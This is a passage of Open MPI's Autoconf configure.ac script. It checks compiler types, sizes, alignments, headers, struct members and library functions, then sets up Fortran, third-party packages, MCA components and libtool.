    AC_MSG_CHECKING([if Intel compiler supports "short float" properly])
    AC_COMPILE_IFELSE(
        [AC_LANG_SOURCE([float f(short float a, short float b) { return (float)(a + b); }])],
        [AC_MSG_RESULT([yes])],
        [ac_cv_type_short_float="no"
         ac_cv_type_short_float__Complex="no"]
         AC_MSG_RESULT([no]))
fi

AC_CHECK_TYPES(int8_t)
AC_CHECK_TYPES(uint8_t)
AC_CHECK_TYPES(int16_t)
AC_CHECK_TYPES(uint16_t)
AC_CHECK_TYPES(int32_t)
AC_CHECK_TYPES(uint32_t)
AC_CHECK_TYPES(int64_t)
AC_CHECK_TYPES(uint64_t)
AC_CHECK_TYPES(int128_t)
AC_CHECK_TYPES(__int128)
AC_CHECK_TYPES(uint128_t)
AC_CHECK_TYPES(long long)

AC_CHECK_TYPES(_Float128)
AC_CHECK_TYPES(__float128)
AC_CHECK_TYPES(short float)
AC_CHECK_TYPES(long double)
# We only need these types if we're building the OMPI project, but
# OPAL currently doesn't protect for their lack of presence well.
AC_CHECK_HEADERS(complex.h)
AC_CHECK_TYPES(short float _Complex)
AC_CHECK_TYPES(float _Complex)
AC_CHECK_TYPES(double _Complex)
AC_CHECK_TYPES(long double _Complex)
AC_CHECK_TYPES(_Float128 _Complex)
AC_CHECK_TYPES(__float128 _Complex)

AC_CHECK_TYPES(intptr_t)
AC_CHECK_TYPES(uintptr_t)
AC_CHECK_TYPES(mode_t)
AC_CHECK_TYPES(ssize_t)
AC_CHECK_TYPES(ptrdiff_t)

#
# Check for type sizes
#

AC_CHECK_SIZEOF(_Bool)
AC_CHECK_SIZEOF(char)
AC_CHECK_SIZEOF(short)
AC_CHECK_SIZEOF(int)
AC_CHECK_SIZEOF(unsigned int)
AC_CHECK_SIZEOF(long)
AC_CHECK_SIZEOF(unsigned long)
AC_CHECK_SIZEOF(long long)
if test "$ac_cv_type_short_float" = yes; then
    AC_CHECK_SIZEOF(short float)
fi
AC_CHECK_SIZEOF(float)
AC_CHECK_SIZEOF(double)
AC_CHECK_SIZEOF(long double)
if test "$ac_cv_type__Float128" = yes; then
    AC_CHECK_SIZEOF(_Float128)
fi
if test "$ac_cv_type___float128" = yes; then
    AC_CHECK_SIZEOF(__float128)
fi
# We only need these types if we're building the OMPI project, but
# OPAL currently doesn't protect for their lack of presence well.
if test "$ac_cv_type_short_float__Complex" = yes; then
    AC_CHECK_SIZEOF(short float _Complex)
fi
AC_CHECK_SIZEOF(float _Complex)
AC_CHECK_SIZEOF(double _Complex)
AC_CHECK_SIZEOF(long double _Complex)
if test "$ac_cv_type__Float128__Complex" = yes; then
    AC_CHECK_SIZEOF(_Float128 _Complex)
fi
if test "$ac_cv_type___float128__Complex" = yes; then
    AC_CHECK_SIZEOF(__float128 _Complex)
fi

AC_CHECK_SIZEOF(void *)
AS_IF([test "$ac_cv_sizeof_void_p" -eq 4],
      [AC_MSG_WARN([Open MPI no longer supports 32 bit builds.])
       AC_MSG_WARN([Please use Open MPI v4.x or earlier if you need 32 bit support.])
       AC_MSG_ERROR([Cannot continue])])
AC_CHECK_SIZEOF(size_t)
if test "$ac_cv_type_ssize_t" = yes ; then
    AC_CHECK_SIZEOF(ssize_t)
fi
if test "$ac_cv_type_ptrdiff_t" = yes; then
    AC_CHECK_SIZEOF(ptrdiff_t)
else
    AC_MSG_ERROR([ptrdiff_t type is not available, this is required by C99 standard.  Cannot continue])
fi
AC_CHECK_SIZEOF(wchar_t)

AC_CHECK_SIZEOF(pid_t)

# Check sizes of atomic types so we can define fixed-width types in OPAL
AC_CHECK_SIZEOF(atomic_short, [],[[#include <stdatomic.h>]])
AC_CHECK_SIZEOF(atomic_int,[],[[#include <stdatomic.h>]])
AC_CHECK_SIZEOF(atomic_long,[],[[#include <stdatomic.h>]])
AC_CHECK_SIZEOF(atomic_llong,[],[[#include <stdatomic.h>]])

#
# Check for type alignments
#

OPAL_C_GET_ALIGNMENT(bool, OPAL_ALIGNMENT_BOOL)
OPAL_C_GET_ALIGNMENT(int8_t, OPAL_ALIGNMENT_INT8)
OPAL_C_GET_ALIGNMENT(int16_t, OPAL_ALIGNMENT_INT16)
OPAL_C_GET_ALIGNMENT(int32_t, OPAL_ALIGNMENT_INT32)
OPAL_C_GET_ALIGNMENT(int64_t, OPAL_ALIGNMENT_INT64)
if test "$ac_cv_type_int128_t" = yes ; then
  OPAL_C_GET_ALIGNMENT(int128_t, OPAL_ALIGNMENT_INT128)
fi
OPAL_C_GET_ALIGNMENT(char, OPAL_ALIGNMENT_CHAR)
OPAL_C_GET_ALIGNMENT(short, OPAL_ALIGNMENT_SHORT)
OPAL_C_GET_ALIGNMENT(wchar_t, OPAL_ALIGNMENT_WCHAR)
OPAL_C_GET_ALIGNMENT(int, OPAL_ALIGNMENT_INT)
OPAL_C_GET_ALIGNMENT(long, OPAL_ALIGNMENT_LONG)
OPAL_C_GET_ALIGNMENT(long long, OPAL_ALIGNMENT_LONG_LONG)
if test "$ac_cv_type_short_float" = yes; then
    OPAL_C_GET_ALIGNMENT(short float, OPAL_ALIGNMENT_SHORT_FLOAT)
fi
OPAL_C_GET_ALIGNMENT(float, OPAL_ALIGNMENT_FLOAT)
OPAL_C_GET_ALIGNMENT(double, OPAL_ALIGNMENT_DOUBLE)
OPAL_C_GET_ALIGNMENT(long double, OPAL_ALIGNMENT_LONG_DOUBLE)
if test "$ac_cv_type__Float128" = yes; then
    OPAL_C_GET_ALIGNMENT(_Float128, OPAL_ALIGNMENT__FLOAT128)
fi
if test "$ac_cv_type___float128" = yes; then
    OPAL_C_GET_ALIGNMENT(__float128, OPAL_ALIGNMENT___FLOAT128)
fi


# We only need these types if we're building the OMPI project, but
# OPAL currently doesn't protect for their lack of presence well.
if test "$ac_cv_type_short_float__Complex" = yes; then
    OPAL_C_GET_ALIGNMENT(short float _Complex, OPAL_ALIGNMENT_SHORT_FLOAT_COMPLEX)
fi
OPAL_C_GET_ALIGNMENT(float _Complex, OPAL_ALIGNMENT_FLOAT_COMPLEX)
OPAL_C_GET_ALIGNMENT(double _Complex, OPAL_ALIGNMENT_DOUBLE_COMPLEX)
OPAL_C_GET_ALIGNMENT(long double _Complex, OPAL_ALIGNMENT_LONG_DOUBLE_COMPLEX)
if test "$ac_cv_type__Float128__Complex" = yes; then
    OPAL_C_GET_ALIGNMENT(_Float128 _Complex, OPAL_ALIGNMENT__FLOAT128_COMPLEX)
fi
if test "$ac_cv_type___float128__Complex" = yes; then
    OPAL_C_GET_ALIGNMENT(__float128 _Complex, OPAL_ALIGNMENT___FLOAT128_COMPLEX)
fi

OPAL_C_GET_ALIGNMENT(void *, OPAL_ALIGNMENT_VOID_P)
OPAL_C_GET_ALIGNMENT(size_t, OPAL_ALIGNMENT_SIZE_T)

#
# Check for an alternate type of C 'short float'
#

OPAL_CHECK_ALT_SHORT_FLOAT

#
# Check for other compiler characteristics
#

OPAL_C_WEAK_ALIASES
OPAL_C_MACRO_WEAK_ALIASES
OPAL_C_WEAK_SYMBOLS

# The profiling layer:
#
# - Where the C compiler has weak aliases, the public MPI_* symbol is a weak
#   alias of the strong PMPI_* one.
#
# - Where it does not (notably Mach-O, which cannot express a weak alias at
#   all), the public MPI_* symbol is a *weak definition* that forwards to the
#   strong PMPI_* one.
#
# Either way the bindings are compiled exactly once.  Open MPI used to compile
# them a second time, with #defines, purely to emit the MPI_* symbols on
# platforms with no weak aliases; that is no longer necessary, and weak symbols
# are now required.

if test "$WANT_WEAK_ALIASES" = "0"; then
    OPAL_C_HAVE_WEAK_ALIASES=0
fi
AS_IF([test "$OPAL_C_HAVE_WEAK_ALIASES" != "1" && \
       test "$OPAL_C_HAVE_WEAK_SYMBOLS" != "1"],
      [AC_MSG_ERROR([Open MPI requires a C compiler with support for weak
symbols (__attribute__((weak))) or weak aliases; this compiler has neither.
The MPI profiling interface cannot be built without one of them.])])

OMPI_PROFILING_COMPILE_SEPARATELY=0

# Check if we support the offsetof compiler directive

OPAL_CHECK_OFFSETOF


##################################
# C++ compiler characteristics
##################################

# We don't need C++ unless we're building Open MPI, because Open MPI
# supports an "mpicxx" wrapper compiler (there is no C++ code in Open
# MPI -- the MPI C++ bindings were removed in Open MPI v5.0 -- so we
# don't need a C++ compiler for compiling Open MPI itself).
m4_ifdef([project_ompi], [OMPI_SETUP_CXX])

##################################
# Only after setting up both
# C and C++ check compiler attributes.
##################################

opal_show_subtitle "Compiler characteristics"

OPAL_CHECK_ATTRIBUTES
OPAL_CHECK_COMPILER_VERSION_ID

# Open MPI only supports GCC >=v4.8.1.  Notes:
#
# 1. The default compiler that comes with RHEL 7 is v4.8.5 (version ID
#    264197).
# 2. We regularly test with GCC v4.8.1 (version ID 264193).
# 3. GCC 4.8.0 probably also works; we just haven't tested it.
#
# Since we regularly test with 4.8.1, that's what we check for.
AS_IF([test "$opal_cv_compiler_FAMILYNAME" = "GNU" && \
       test "$opal_cv_compiler_VERSION" -lt 264193],
      [AC_MSG_WARN([Open MPI no longer supports versions of the GNU compiler suite])
       AC_MSG_WARN([less than v4.8.1.])
       AC_MSG_WARN([Please upgrade your GNU compiler suite, or use])
       AC_MSG_WARN([a different compiler to build Open MPI.])
       AC_MSG_ERROR([Cannot continue])
      ])

##################################
# MPI / OpenSHMEM API profiling layer
##################################

# Setup profiling bindings (if we're building the relevant projects).
m4_ifdef([project_ompi], [OMPI_SETUP_MPI_PROFILING])
m4_ifdef([project_oshmem], [OSHMEM_SETUP_PROFILING])


##################################
# Assembler Configuration
##################################

opal_show_subtitle "Assembler"

AM_PROG_AS
OPAL_CONFIG_ASM


##################################
# Fortran
##################################

OMPI_BUILD_FORTRAN_BINDINGS=0

m4_ifdef([project_ompi], [OMPI_SETUP_MPI_FORTRAN], [ompi_fortran_happy=0])

# Used in Makefile.ompi-rules
AM_CONDITIONAL(MAN_PAGE_BUILD_MPIFH_BINDINGS,
              [test $OMPI_BUILD_FORTRAN_BINDINGS -gt $OMPI_FORTRAN_NO_BINDINGS])
AM_CONDITIONAL(MAN_PAGE_BUILD_USEMPIF08_BINDINGS,
              [test $OMPI_BUILD_FORTRAN_BINDINGS -ge $OMPI_FORTRAN_USEMPIF08_BINDINGS])

AM_CONDITIONAL(OSHMEM_BUILD_FORTRAN_BINDINGS,
    [test "$enable_oshmem" = "yes" && \
     test "$ompi_fortran_happy" = "1" && \
     test "$OMPI_TRY_FORTRAN_BINDINGS" -gt "$OMPI_FORTRAN_NO_BINDINGS" && \
     test "$enable_oshmem_fortran" != "no"])

# checkpoint results
AC_CACHE_SAVE


##################################
# Wrapper compilers.
#
# Must be called before MCA system
##################################
OPAL_SETUP_WRAPPER_INIT


##################################
# Header files
##################################

opal_show_title "Header file tests"

AC_CHECK_HEADERS([alloca.h aio.h arpa/inet.h dirent.h \
    dlfcn.h endian.h execinfo.h err.h fcntl.h grp.h libgen.h \
    libutil.h memory.h netdb.h netinet/in.h netinet/tcp.h \
    poll.h pthread.h pty.h pwd.h sched.h \
    strings.h stropts.h linux/ethtool.h linux/sockios.h \
    sys/fcntl.h sys/ipc.h sys/shm.h \
    sys/ioctl.h sys/mman.h sys/param.h sys/queue.h \
    sys/resource.h sys/select.h sys/socket.h sys/sockio.h \
    sys/stat.h sys/statfs.h sys/statvfs.h time.h sys/time.h sys/tree.h \
    sys/types.h sys/uio.h sys/un.h net/uio.h sys/utsname.h sys/vfs.h sys/wait.h syslog.h \
    termios.h ulimit.h unistd.h util.h utmp.h malloc.h \
    ifaddrs.h crt_externs.h regex.h mntent.h paths.h \
    ioLib.h sockLib.h hostLib.h shlwapi.h sys/synch.h db.h ndbm.h ieee754.h syslimits.h])

AC_CHECK_HEADERS([sys/mount.h], [], [],
[AC_INCLUDES_DEFAULT
#if HAVE_SYS_PARAM_H
#include <sys/param.h>
#endif
])

AC_CHECK_HEADERS([sys/sysctl.h], [], [],
[AC_INCLUDES_DEFAULT
#if HAVE_SYS_PARAM_H
#include <sys/param.h>
#endif
])

# Needed to work around Darwin requiring sys/socket.h for
# net/if.h
AC_CHECK_HEADERS([net/if.h], [], [],
    [#include <stdio.h>
#if STDC_HEADERS
# include <stdlib.h>
# include <stddef.h>
#else
# if HAVE_STDLIB_H
#  include <stdlib.h>
# endif
#endif
#if HAVE_SYS_SOCKET_H
# include <sys/socket.h>
#endif
])

# checkpoint results
AC_CACHE_SAVE


##################################
# Types
##################################

opal_show_title "Type tests"

AC_CHECK_TYPES([socklen_t, struct sockaddr_in, struct sockaddr_in6,
                struct sockaddr_storage, struct ifreq, struct ethtool_cmd],
               [], [], [AC_INCLUDES_DEFAULT
#if HAVE_SYS_SOCKET_H
#include <sys/socket.h>
#endif
#ifdef HAVE_NETINET_IN_H
#include <netinet/in.h>
#endif
#ifdef HAVE_LINUX_ETHTOOL_H
#include <linux/ethtool.h>
#endif
#ifdef HAVE_NET_IF_H
#include <net/if.h>
#endif])

AC_CHECK_DECLS([ethtool_cmd_speed, SIOCETHTOOL],
               [], [], [AC_INCLUDES_DEFAULT
#ifdef HAVE_LINUX_ETHTOOL_H
#include <linux/ethtool.h>
#endif
#ifdef HAVE_LINUX_SOCKIOS_H
#include <linux/sockios.h>
#endif])

AC_CHECK_MEMBERS([struct ethtool_cmd.speed_hi],
               [], [], [AC_INCLUDES_DEFAULT
#ifdef HAVE_LINUX_ETHTOOL_H
#include <linux/ethtool.h>
#endif
#ifdef HAVE_LINUX_SOCKIOS_H
#include <linux/sockios.h>
#endif])

AC_CHECK_MEMBERS([struct ethtool_cmd.speed_hi],
               [], [], [AC_INCLUDES_DEFAULT
#ifdef HAVE_LINUX_ETHTOOL_H
#include <linux/ethtool.h>
#endif
#ifdef HAVE_LINUX_SOCKIOS_H
#include <linux/sockios.h>
#endif])

AC_CHECK_MEMBERS([struct ethtool_cmd.speed_hi],
               [], [], [AC_INCLUDES_DEFAULT
#ifdef HAVE_LINUX_ETHTOOL_H
#include <linux/ethtool.h>
#endif
#ifdef HAVE_LINUX_SOCKIOS_H
#include <linux/sockios.h>
#endif])

AC_CHECK_MEMBERS([struct ethtool_cmd.speed_hi],
               [], [], [AC_INCLUDES_DEFAULT
#ifdef HAVE_LINUX_ETHTOOL_H
#include <linux/ethtool.h>
#endif
#ifdef HAVE_LINUX_SOCKIOS_H
#include <linux/sockios.h>
#endif])

AC_CHECK_DECLS([AF_UNSPEC, PF_UNSPEC, AF_INET6, PF_INET6],
               [], [], [AC_INCLUDES_DEFAULT
#if HAVE_SYS_SOCKET_H
#include <sys/socket.h>
#endif
#ifdef HAVE_NETINET_IN_H
#include <netinet/in.h>
#endif])

# SA_RESTART in signal.h
OPAL_VAR_SCOPE_PUSH([MSG])
AC_MSG_CHECKING([if SA_RESTART defined in signal.h])
AC_EGREP_CPP(yes, [
#include <signal.h>
#ifdef SA_RESTART
    yes
#endif ], [MSG=yes VALUE=1], [MSG=no VALUE=0])
AC_DEFINE_UNQUOTED(OPAL_HAVE_SA_RESTART, $VALUE,
    [Whether we have SA_RESTART in <signal.h> or not])
AC_MSG_RESULT([$MSG])
OPAL_VAR_SCOPE_POP

AC_CHECK_MEMBERS([struct sockaddr.sa_len], [], [], [
#include <sys/types.h>
#if HAVE_SYS_SOCKET_H
#include <sys/socket.h>
#endif])

AC_CHECK_MEMBERS([struct dirent.d_type], [], [], [
#include <sys/types.h>
#include <dirent.h>])

AC_CHECK_MEMBERS([siginfo_t.si_fd],,,[#include <signal.h>])
AC_CHECK_MEMBERS([siginfo_t.si_band],,,[#include <signal.h>])

#
# Checks for struct member names in struct statfs
#
AC_CHECK_MEMBERS([struct statfs.f_type], [], [], [
AC_INCLUDES_DEFAULT
#ifdef HAVE_SYS_VFS_H
#include <sys/vfs.h>
#endif
#ifdef HAVE_SYS_STATFS_H
#include <sys/statfs.h>
#endif
])

AC_CHECK_MEMBERS([struct statfs.f_fstypename], [], [], [
AC_INCLUDES_DEFAULT
#ifdef HAVE_SYS_PARAM_H
#include <sys/param.h>
#endif
#ifdef HAVE_SYS_MOUNT_H
#include <sys/mount.h>
#endif
#ifdef HAVE_SYS_VFS_H
#include <sys/vfs.h>
#endif
#ifdef HAVE_SYS_STATFS_H
#include <sys/statfs.h>
#endif
])

#
# Checks for struct member names in struct statvfs
#
AC_CHECK_MEMBERS([struct statvfs.f_basetype], [], [], [
AC_INCLUDES_DEFAULT
#ifdef HAVE_SYS_STATVFS_H
#include <sys/statvfs.h>
#endif
])

AC_CHECK_MEMBERS([struct statvfs.f_fstypename], [], [], [
AC_INCLUDES_DEFAULT
#ifdef HAVE_SYS_STATVFS_H
#include <sys/statvfs.h>
#endif
])

AC_CHECK_MEMBERS([struct timespec.tv_nsec],
               [], [], [AC_INCLUDES_DEFAULT
#ifdef HAVE_TIME_H
#include <time.h>
#endif
#ifdef HAVE_SYS_TIME_H
#include <sys/time.h>
#endif])

#
# Determine the type backing opal_count_t.  This runs unconditionally (OPAL
# must build standalone) and is the single source of truth for the count type:
# OMPI_FIND_MPI_AINT_COUNT_OFFSET (below) derives MPI_Count from the same
# OPAL_COUNT_* values rather than recomputing them.
#
OPAL_FIND_COUNT_TYPE

#
# Find corresponding types for MPI_Aint, MPI_Count, and MPI_Offset.
# And if relevant, find the corresponding MPI_ADDRESS_KIND,
# MPI_COUNT_KIND, and MPI_OFFSET_KIND.
#
m4_ifdef([project_ompi], [OMPI_FIND_MPI_AINT_COUNT_OFFSET])

#
# now that we have MPI_COUNT_KIND set, try building
# MPI F08 bindings if that level of fortran support is requested
#
m4_ifdef([project_ompi], [AS_IF([test $OMPI_BUILD_FORTRAN_BINDINGS -ge $OMPI_FORTRAN_USEMPIF08_BINDINGS],
                                [OMPI_FORTRAN_CHECK_BIG_COUNT([],
                                     [AC_MSG_ERROR([The mpi_f08 module cannot be compiled using the current set of Fortran compiler options ($FCFLAGS).  Either change compiler options or use --enable-mpi-fortran=usempi])])
                                ])])
# checkpoint results
AC_CACHE_SAVE

##################################
# Linker characteristics
##################################

AC_MSG_CHECKING([the linker for support for the -fini option])
OPAL_VAR_SCOPE_PUSH([LDFLAGS_save])
LDFLAGS_save=$LDFLAGS
LDFLAGS="$LDFLAGS_save -Wl,-fini -Wl,finalize"
AC_LINK_IFELSE([AC_LANG_PROGRAM([void finalize (void) {}], [])],
               [AC_MSG_RESULT([yes])
        opal_ld_have_fini=1], [AC_MSG_RESULT([no])
        opal_ld_have_fini=0])
LDFLAGS=$LDFLAGS_save
OPAL_VAR_SCOPE_POP

##################################
# Libraries
##################################

opal_show_title "Library and Function tests"

# Darwin doesn't need -lutil, as it's something other than this -lutil.
OPAL_SEARCH_LIBS_CORE([openpty], [util])

OPAL_SEARCH_LIBS_CORE([gethostbyname], [nsl])

OPAL_SEARCH_LIBS_CORE([socket], [socket])

# Solaris has sched_yield in -lrt, usually in libc
OPAL_SEARCH_LIBS_CORE([sched_yield], [rt])

# IRIX and CentOS have dirname in -lgen, usually in libc
OPAL_SEARCH_LIBS_CORE([dirname], [gen])

# Darwin doesn't need -lm, as it's a symlink to libSystem.dylib
OPAL_SEARCH_LIBS_CORE([ceil], [m])

# -lrt might be needed for clock_gettime
OPAL_SEARCH_LIBS_CORE([clock_gettime], [rt])

AC_CHECK_FUNCS([asprintf snprintf vasprintf vsnprintf openpty isatty getpwuid fork waitpid execve pipe ptsname setsid mmap tcgetpgrp posix_memalign strsignal sysconf syslog vsyslog regcmp regexec regfree _NSGetEnviron socketpair usleep mkfifo dbopen dbm_open statfs statvfs setpgid setenv __malloc_initialize_hook __clear_cache on_exit])

# Sanity check: ensure that we got at least one of statfs or statvfs.
if test $ac_cv_func_statfs = no && test $ac_cv_func_statvfs = no; then
    AC_MSG_WARN([neither statfs() and statvfs() were found])
    AC_MSG_ERROR([Cannot continue])
fi

# On some hosts, htonl is a define, so the AC_CHECK_FUNC will get
# confused.  On others, it's in the standard library, but stubbed with
# the magic glibc foo as not implemented.  and on other systems, it's
# just not there.  This covers all cases.
AC_CACHE_CHECK([for htonl define],
  [ompi_cv_htonl_define],
  [AC_PREPROC_IFELSE([AC_LANG_PROGRAM([
#ifdef HAVE_SYS_TYPES_H
#include <sys/types.h>
#endif
#ifdef HAVE_NETINET_IN_H
#include <netinet/in.h>
#endif
#ifdef HAVE_ARPA_INET_H
#include <arpa/inet.h>
#endif],[
#ifndef ntohl
#error "ntohl not defined"
#endif
])], [ompi_cv_htonl_define=yes], [ompi_cv_htonl_define=no])])
AC_CHECK_FUNC([htonl], [ompi_have_htonl=yes], [ompi_have_htonl=no])
AS_IF([test "$ompi_cv_htonl_define" = "yes" || test "$ompi_have_htonl" = "yes"],
    [AC_DEFINE_UNQUOTED([HAVE_UNIX_BYTESWAP], [1],
        [whether unix byteswap routines -- htonl, htons, nothl, ntohs -- are available])])

#
# Make sure we can copy va_lists (need check declared, not linkable)
#

AC_CHECK_DECL(va_copy, OPAL_HAVE_VA_COPY=1, OPAL_HAVE_VA_COPY=0,
    [#include <stdarg.h>])
AC_DEFINE_UNQUOTED(OPAL_HAVE_VA_COPY, $OPAL_HAVE_VA_COPY,
    [Whether we have va_copy or not])

AC_CHECK_DECL(__va_copy, OPAL_HAVE_UNDERSCORE_VA_COPY=1,
    OPAL_HAVE_UNDERSCORE_VA_COPY=0, [#include <stdarg.h>])
AC_DEFINE_UNQUOTED(OPAL_HAVE_UNDERSCORE_VA_COPY, $OPAL_HAVE_UNDERSCORE_VA_COPY,
    [Whether we have __va_copy or not])

AC_CHECK_DECLS(__func__)

# checkpoint results
AC_CACHE_SAVE


##################################
# System-specific tests
##################################

opal_show_title "System-specific tests"

##################################
OAC_CHECK_OS_FLAVORS



# Do we have _SC_NPROCESSORS_ONLN? (only going to pass if we also have
# <unistd.h> and sysconf(), which is ok) OS X 10.4 has <unistd.h> and
# sysconf(), but does not have _SC_NPROCESSORS_ONLN.  Doh!

AC_CACHE_CHECK([for _SC_NPROCESSORS_ONLN],
  [ompi_cv_have__SC_NPROCESSORS_ONLN],
  [AC_COMPILE_IFELSE([AC_LANG_PROGRAM([
AC_INCLUDES_DEFAULT
#include <unistd.h>
],
     [int i = _SC_NPROCESSORS_ONLN;])],
     [ompi_cv_have__SC_NPROCESSORS_ONLN="yes"],
     [ompi_cv_have__SC_NPROCESSORS_ONLN="no"])])
AS_IF([test "$ompi_cv_have__SC_NPROCESSORS_ONLN" = "yes"],
      [result=1], [result=0])
AC_DEFINE_UNQUOTED([OPAL_HAVE__SC_NPROCESSORS_ONLN], [$result],
  [Define to 1 ifyou have the declaration of _SC_NPROCESSORS_ONLN, and to 0 otherwise])

# all: endian

AC_C_BIGENDIAN

# all: SYSV semaphores
# all: SYSV shared memory
# all: size of FD_SET
# all: sizeof struct stat members
# all: type of getsockopt optlen
# all: type of recvfrom optlen

#
# What is the local equivalent of "ln -s"
#

AC_PROG_LN_S

AC_PROG_GREP
AC_PROG_EGREP

#
# We need as and flex
#
AM_PROG_AS

dnl Note that prior to AC v2.70, PROG_LEX did not take any arguments.
dnl But it is harmless to pass an argument to it ($1 will just be
dnl ignored).
AC_PROG_LEX([noyywrap])

# If we don't have Flex and we don't have a generated .c file
# (distribution tarballs will have the .c file included, but git
# clones will not), then error.  Must have Flex -- other versions of
# Lex are not workable (all things being equal, since this is *only*
# required for developers, we decided that it really was not worth it
# to be portable between different versions of lex ;-).
AS_IF([test -z "$LEX" || \
   test -n "`echo $LEX | $GREP missing`" || \
   test "`basename $LEX`" != "flex"],
    [AS_IF([test ! -f "$srcdir/opal/util/keyval/keyval_lex.c"],
       [AC_MSG_WARN([*** Could not find Flex on your system.])
        AC_MSG_WARN([*** Flex is required for developer builds of Open MPI.])
        AC_MSG_WARN([*** Other versions of Lex are not supported.])
        AC_MSG_WARN([*** NOTE: If you are building a tarball downloaded from www.open-mpi.org, you do not need Flex])
        AC_MSG_ERROR([Cannot continue])
       ])
    ])

#
# Setup HTML and man page processing
#

dnl Note that we have to double escape the URL below
dnl so that the # it contains doesn't confuse the Autotools
OAC_SETUP_SPHINX([$srcdir/docs/man/MPI_T.3],
                 [[https://docs.open-mpi.org/en/main/developers/prerequisites.html#sphinx-and-therefore-python]],
                 [$srcdir/docs/requirements.txt])

#
# File system case sensitivity
#

OPAL_CASE_SENSITIVE_FS_SETUP

# AIX: FIONBIO in sys/ioctl.h
# glibc: memcpy

#
# Do we have RLIMIT_NPROC in <sys/resources.h>? (e.g., Solaris does not)
#

AC_CHECK_DECLS([RLIMIT_NPROC], [], [], [
AC_INCLUDES_DEFAULT
#if HAVE_SYS_RESOURCE_H
#include <sys/resource.h>
#endif])

#
# Do we have RLIMIT_MEMLOCK in <sys/resources.h>? (e.g., Solaris does not)
#

AC_CHECK_DECLS([RLIMIT_MEMLOCK], [], [], [
AC_INCLUDES_DEFAULT
#if HAVE_SYS_RESOURCE_H
#include <sys/resource.h>
#endif])

#
# Do we have RLIMIT_NOFILE in <sys/resources.h>? (e.g., Solaris does not)
#

AC_CHECK_DECLS([RLIMIT_NOFILE], [], [], [
AC_INCLUDES_DEFAULT
#if HAVE_SYS_RESOURCE_H
#include <sys/resource.h>
#endif])

#
# Do we have RLIMIT_MEMLOCK in <sys/resources.h>? (e.g., Solaris does not)
#

AC_CHECK_DECLS([RLIMIT_FSIZE], [], [], [
AC_INCLUDES_DEFAULT
#if HAVE_SYS_RESOURCE_H
#include <sys/resource.h>
#endif])

#
# Do we have RLIMIT_CORE in <sys/resources.h>? (e.g., Solaris does not)
#

AC_CHECK_DECLS([RLIMIT_CORE], [], [], [
AC_INCLUDES_DEFAULT
#if HAVE_SYS_RESOURCE_H
#include <sys/resource.h>
#endif])

#
# Do we have RLIMIT_STACK in <sys/resources.h>? (e.g., Solaris does not)
#

AC_CHECK_DECLS([RLIMIT_STACK], [], [], [
AC_INCLUDES_DEFAULT
#if HAVE_SYS_RESOURCE_H
#include <sys/resource.h>
#endif])

#
# Do we have RLIMIT_AS in <sys/resources.h>? (e.g., Solaris does not)
#

AC_CHECK_DECLS([RLIMIT_AS], [], [], [
AC_INCLUDES_DEFAULT
#if HAVE_SYS_RESOURCE_H
#include <sys/resource.h>
#endif])

# checkpoint results
AC_CACHE_SAVE

##################################
#        Fault Tolerance
# Part1: must happen before prte
##################################
OPAL_SETUP_FT_OPTIONS

##################################
# 3rd-party packages not called ROMIO
##################################
opal_show_title "3rd-party packages"

OPAL_3RDPARY_SUBDIRS=
OPAL_3RDPARY_DIST_SUBDIRS=
OPAL_3RDPARY_EXTRA_DIST=
OPAL_3RDPARY_DISTCLEAN_DIRS=

OPAL_CONFIG_LIBEVENT
OPAL_CONFIG_HWLOC
OPAL_CONFIG_PMIX
OMPI_SETUP_PRRTE

AC_SUBST(OPAL_3RDPARTY_SUBDIRS)
AC_SUBST(OPAL_3RDPARTY_DIST_SUBDIRS)
AC_SUBST(OPAL_3RDPARTY_EXTRA_DIST)
AC_SUBST(OPAL_3RDPARTY_DISTCLEAN_DIRS)

##################################
#        Fault Tolerance
# Part2: must happen after prte
##################################
OPAL_SETUP_FT

##################################
# MPI Forum values
##################################
OMPI_GET_FORUM_ABI_VALUES

##################################
# MCA
##################################

opal_show_title "Modular Component Architecture (MCA) setup"

AC_MSG_CHECKING([for subdir args])
OPAL_CONFIG_SUBDIR_ARGS([opal_subdir_args])
AC_MSG_RESULT([$opal_subdir_args])

OPAL_MCA

#
# Now that we know how to support threads with wrappers, update
#
OPAL_WRAPPER_FLAGS_ADD([CFLAGS], [$THREAD_CFLAGS])
OPAL_WRAPPER_FLAGS_ADD([CXXFLAGS], [$THREAD_CXXFLAGS])
OPAL_WRAPPER_FLAGS_ADD([FCFLAGS], [$THREAD_FCFLAGS])
OPAL_WRAPPER_FLAGS_ADD([LDFLAGS], [$THREAD_LDFLAGS])

m4_ifdef([project_ompi], [OMPI_REQUIRE_ENDPOINT_TAG_FINI])

# Last minute disable of OpenSHMEM if we didn't find any oshmem SPMLs
if test "$project_oshmem_amc" = "true" && test $OSHMEM_FOUND_WORKING_SPML -eq 0 ; then
    # We don't have an spml that will work, so oshmem wouldn't be able
    # to run an application.  Therefore, don't build the oshmem layer.
    if test "$enable_oshmem" != "no" && test -n "$enable_oshmem"; then
	AC_MSG_WARN([No spml found, so OpenSHMEM layer will be non functional.])
	AC_MSG_ERROR([Aborting because OpenSHMEM requested, but can not build.])
    else
	AC_MSG_WARN([No spml found.  Will not build OpenSHMEM layer.])
	project_oshmem_amc="false (no spml)"
	# now for the hard part, remove project from list that will
	# run.  This is a hack, but it works as long as the project
	# remains named "oshmem".
	MCA_PROJECT_SUBDIRS=`echo "$MCA_PROJECT_SUBDIRS" | sed -e 's/oshmem//'`
    fi
fi

# checkpoint results
AC_CACHE_SAVE

##################################
# MPI Extended Interfaces
##################################

m4_ifdef([project_ompi], [OMPI_SETUP_MPI_EXT])

# checkpoint results
AC_CACHE_SAVE

##################################
# Visibility
##################################

# Check the visibility declspec at the end to avoid problem with
# the previous tests that are not necessarily prepared for
# the visibility feature.
opal_show_title "Symbol visibility feature"

OPAL_CHECK_VISIBILITY


############################################################################
# Final top-level OMPI configuration
############################################################################

opal_show_title "Final top-level OMPI configuration"

############################################################################
# Libtool: part two
# (after C compiler setup = no compiler/linker tests after this)
############################################################################

opal_show_subtitle "Libtool configuration"

# Due to this thread:
# https://www.open-mpi.org/community/lists/users/2013/02/21356.php and
# a helpful tip from Dave Goodell, set the precious variables for
# compilers to "no" that we don't want.  Libtool's m4 configry will
# interpret this as "I won't be using this language; don't bother
# setting it up."  Note that we do this only for Fortran; we *don't*
# do this for C++, because *do* still want to setup the mpicxx wrapper
# if we have a C++ compiler.
AS_IF([test "$OMPI_TRY_FORTRAN_BINDINGS" = "$OMPI_FORTRAN_NO_BINDINGS"],[F77=no FC=no])

LT_INIT

# What's the suffix of shared libraries?  Inspired by generated
